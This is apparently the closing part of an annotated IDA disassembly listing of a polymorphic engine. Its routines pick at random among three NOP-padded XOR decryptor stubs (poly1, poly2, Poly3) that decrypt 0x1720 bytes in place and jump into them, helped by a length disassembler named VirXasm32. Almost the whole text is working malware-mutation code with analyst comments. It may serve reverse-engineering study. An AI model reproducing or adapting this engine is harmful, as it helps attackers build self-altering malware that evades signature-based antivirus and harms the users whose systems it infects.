.text:00402657 8B 9D BB 25 40 00                          mov     ebx, ss:offsetLoop2[ebp] ; ebx = len of the loop
.text:0040265D 43                                         inc     ebx
.text:0040265E F6 D3                                      not     bl
.text:00402660 88 18                                      mov     [eax], bl
.text:00402662 C3                                         retn                    ; idea: take data from polys, feed to the engine, write at the egg
.text:00402663
.text:00402663                            ; =============== S U B R O U T I N E =======================================
.text:00402663
.text:00402663                            ; zero out ebx
.text:00402663
.text:00402663                            seek_order      proc near               ; CODE XREF: polyizer+4B\u2191p
.text:00402663 33 DB                                      xor     ebx, ebx        ; zero out ebx
.text:00402665 0B C9                                      or      ecx, ecx        ; if ecx == 0
.text:00402667 74 17                                      jz      short exit_seek ; if it is, jump
.text:00402669
.text:00402669                            loc_402669:                             ; CODE XREF: seek_order+1B\u2193j
.text:00402669 E8 FC FD FF FF                             call    VirXasm32       ; get length of instruction pointed to be esi
.text:0040266E                            ; ---------------------------------------------------------------------------
.text:0040266E 03 D8                                      add     ebx, eax        ; add the length to ebx
.text:00402670 03 F0                                      add     esi, eax        ; point to next instruction
.text:00402672 E8 F3 FD FF FF                             call    VirXasm32       ; get length of the next instr
.text:00402677                            ; ---------------------------------------------------------------------------
.text:00402677 03 D8                                      add     ebx, eax        ; add that to ebx as well
.text:00402679 03 F0                                      add     esi, eax        ; esi point to next instruction
.text:0040267B 49                                         dec     ecx             ; ecx--, stepped over 1 instruction set
.text:0040267C 0B C9                                      or      ecx, ecx        ; check if no more left
.text:0040267E 75 E9                                      jnz     short loc_402669 ; jump if more instruction sets left to step over based on the value that was supplied to seek_order (ecx)
.text:00402680
.text:00402680                            exit_seek:                              ; CODE XREF: seek_order+4\u2191j
.text:00402680 C3                                         retn                    ; return
.text:00402680                            seek_order      endp
.text:00402680
.text:00402680                            ; ---------------------------------------------------------------------------
.text:00402681 00 00 00                   weirdOffset     db 3 dup(0)             ; DATA XREF: polyizer+28\u2191o
.text:00402681                                                                    ; decideOnRandFunc+16\u2193o
.text:00402684 00                                         db 0
.text:00402685 1D                                         db  1Dh
.text:00402686 00                                         db    0
.text:00402687 00                                         db    0
.text:00402688 00                                         db    0
.text:00402689 40                                         db  40h ; @
.text:0040268A 00                                         db    0
.text:0040268B 00                                         db    0
.text:0040268C 00                                         db 0
.text:0040268D
.text:0040268D                            ; =============== S U B R O U T I N E =======================================
.text:0040268D
.text:0040268D
.text:0040268D                            decideOnRandFunc proc near              ; CODE XREF: polyizer+3B\u2191p
.text:0040268D 51                                         push    ecx             ; save 9
.text:0040268E 53                                         push    ebx             ; save ebx
.text:0040268F B9 03 00 00 00                             mov     ecx, 3          ; ecx = 3
.text:00402694 E8 AD FD FF FF                             call    rand            ; call rand, returns random [1:3]
.text:00402699 48                                         dec     eax             ; eax --
.text:0040269A 33 D2                                      xor     edx, edx        ; clear
.text:0040269C B9 04 00 00 00                             mov     ecx, 4          ; ecx = 4
.text:004026A1 F7 E1                                      mul     ecx             ; eax = eax * ecx
.text:004026A3 8D 95 81 26 40 00                          lea     edx, weirdOffset[ebp] ; load offset_label addr into edx
.text:004026A9 03 D0                                      add     edx, eax        ; add the randomly generated eax
.text:004026AB 8B 12                                      mov     edx, [edx]      ; grab the value at this randomly chosed offset
.text:004026AD 8D 9D BA 26 40 00                          lea     ebx, poly1[ebp] ; load the effective address of poly_1 into ebx
.text:004026B3 03 DA                                      add     ebx, edx        ; grab the randomly chosen offset and add it to poly1's address
.text:004026B5 87 D3                                      xchg    edx, ebx        ; swap
.text:004026B7 5B                                         pop     ebx             ; restore
.text:004026B8 59                                         pop     ecx             ; restore
.text:004026B9 C3                                         retn                    ; return with edx = offset to random polyizer
.text:004026B9                            decideOnRandFunc endp
.text:004026B9
.text:004026BA
.text:004026BA                            ; =============== S U B R O U T I N E =======================================
.text:004026BA
.text:004026BA
.text:004026BA                            poly1           proc near               ; DATA XREF: decideOnRandFunc+20\u2191o
.text:004026BA
.text:004026BA                            arg_0           = dword ptr  4
.text:004026BA
.text:004026BA 5A                                         pop     edx
.text:004026BB 90                                         nop
.text:004026BC 8B 12                                      mov     edx, [edx]
.text:004026BE 90                                         nop
.text:004026BF 31 14 24                                   xor     [esp-4+arg_0], edx
.text:004026C2 90                                         nop
.text:004026C3 B9 20 17 00 00                             mov     ecx, 1720h
.text:004026C8 90                                         nop
.text:004026C9 8B 34 24                                   mov     esi, [esp-4+arg_0]
.text:004026CC 90                                         nop
.text:004026CD
.text:004026CD                            loc_4026CD:                             ; CODE XREF: poly1+18\u2193j
.text:004026CD 31 16                                      xor     [esi], edx
.text:004026CF 90                                         nop
.text:004026D0 46                                         inc     esi
.text:004026D1 90                                         nop
.text:004026D2 E2 F9                                      loop    loc_4026CD
.text:004026D4 90                                         nop
.text:004026D5 C3                                         retn
.text:004026D5                            poly1           endp ; sp-analysis failed
.text:004026D5
.text:004026D5                            ; ---------------------------------------------------------------------------
.text:004026D6 90                                         db 90h
.text:004026D7
.text:004026D7                            ; =============== S U B R O U T I N E =======================================
.text:004026D7
.text:004026D7
.text:004026D7                            poly2           proc near
.text:004026D7 8B 14 24                                   mov     edx, [esp+0]
.text:004026DA 83 C4 04                                   add     esp, 4
.text:004026DD FF 32                                      push    dword ptr [edx]
.text:004026DF 5A                                         pop     edx
.text:004026E0 8B FC                                      mov     edi, esp
.text:004026E2 31 17                                      xor     [edi], edx
.text:004026E4 68 20 17 00 00                             push    1720h
.text:004026E9 59                                         pop     ecx
.text:004026EA 5E                                         pop     esi
.text:004026EB 56                                         push    esi
.text:004026EC
.text:004026EC                            loc_4026EC:                             ; CODE XREF: poly2+1D\u2193j
.text:004026EC 8B FA                                      mov     edi, edx
.text:004026EE 31 3E                                      xor     [esi], edi
.text:004026F0 83 C6 01                                   add     esi, 1
.text:004026F3 90                                         nop
.text:004026F4 E2 F6                                      loop    loc_4026EC
.text:004026F6 90                                         nop
.text:004026F7 5D                                         pop     ebp
.text:004026F8 FF E5                                      jmp     ebp
.text:004026F8                            poly2           endp ; sp-analysis failed
.text:004026F8
.text:004026FA                            ; ---------------------------------------------------------------------------
.text:004026FA
.text:004026FA                            Poly3:
.text:004026FA 59                                         pop     ecx
.text:004026FB 8B D1                                      mov     edx, ecx
.text:004026FD 8B 0A                                      mov     ecx, [edx]
.text:004026FF 8B D1                                      mov     edx, ecx
.text:00402701 8B FC                                      mov     edi, esp
.text:00402703 31 17                                      xor     [edi], edx
.text:00402705 33 C9                                      xor     ecx, ecx
.text:00402707 81 C1 20 17 00 00                          add     ecx, 1720h
.text:0040270D 8B 1F                                      mov     ebx, [edi]
.text:0040270F 87 DE                                      xchg    ebx, esi
.text:00402711
.text:00402711                            loc_402711:                             ; CODE XREF: .text:00402719\u2193j
.text:00402711 8B C2                                      mov     eax, edx
.text:00402713 31 06                                      xor     [esi], eax
.text:00402715 83 D6 01                                   adc     esi, 1
.text:00402718 FC                                         cld
.text:00402719 E2 F6                                      loop    loc_402711
.text:0040271B 87 C9                                      xchg    ecx, ecx
.text:0040271D 5A                                         pop     edx
.text:0040271E FF E2                                      jmp     edx
.text:0040271E                            ; ---------------------------------------------------------------------------
.text:00402720 00 00 00 00 00 00 00 00 00+                align 100h
.text:00402800 ?? ?? ?? ?? ?? ?? ?? ?? ??+                dd 200h dup(?)
.text:00402800 ?? ?? ?? ?? ?? ?? ?? ?? ??+_text           ends
.text:00402800 ?? ?? ?? ?? ?? ?? ?? ?? ??+
.text:00402800 ?? ?? ?? ?? ?? ?? ?? ?? ??+
.text:00402800 ?? ?? ?? ?? ?? ?? ?? ?? ??+                end start
